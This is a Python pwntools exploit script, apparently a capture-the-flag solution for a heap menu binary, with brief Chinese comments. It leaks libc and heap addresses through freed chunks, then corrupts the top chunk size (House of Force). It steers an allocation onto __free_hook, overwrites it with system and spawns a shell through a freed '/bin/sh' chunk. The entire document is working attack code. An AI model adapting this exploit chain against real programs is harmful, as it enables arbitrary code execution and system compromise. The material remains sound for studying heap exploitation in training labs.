from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process([elf.path])


def n64(x): return (x + 0x10000000000000000) & 0xFFFFFFFFFFFFFFFF


def add_chunk(index, size):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("index:", str(index))
    p.sendlineafter("size:", str(size))


def delete_chunk(index):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("index:", str(index))


def edit_chunk(index, content):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("index:", str(index))
    p.sendlineafter("length:", str(len(content)))
    p.sendlineafter("content:", content)


def show_chunk(index):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("index:", str(index))


gdb.attach(p, "c")

add_chunk(0, 0x420)
add_chunk(1, 0x420)
add_chunk(2, 0x420)
add_chunk(3, 0x420)

delete_chunk(0)
delete_chunk(2)

# 泄露libc
show_chunk(0)
libc.address = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3afca0
print("libc:", hex(libc.address))

# 泄露heap
show_chunk(2)
heap = u64(p.recvuntil((b"\x55", b"\x56"))[-6:].ljust(8, b"\x00")) & ~0xfff
print("heap:", hex(heap))

# 清空heap
delete_chunk(1)
delete_chunk(3)

add_chunk(0, 0x18)
# 溢出，使得top_chunk->size = 0xffffffffffffffff
edit_chunk(0, b"a" * 0x18 + p64(n64(-1)))

# 申请大段内存，使得main_arena->top靠近__free_hook
add_chunk(0, (libc.sym["__free_hook"]) - (heap + 0x270) - 0x60)

# 申请一个较小的chunk，其user data可以包含__free_hook
add_chunk(1, 0x100)
# 修改__free_hook为system
edit_chunk(1, b"/bin/sh\x00".ljust(0x48, b"\x00") + p64(libc.sym["system"]))

# get shell
delete_chunk(1)

p.interactive()
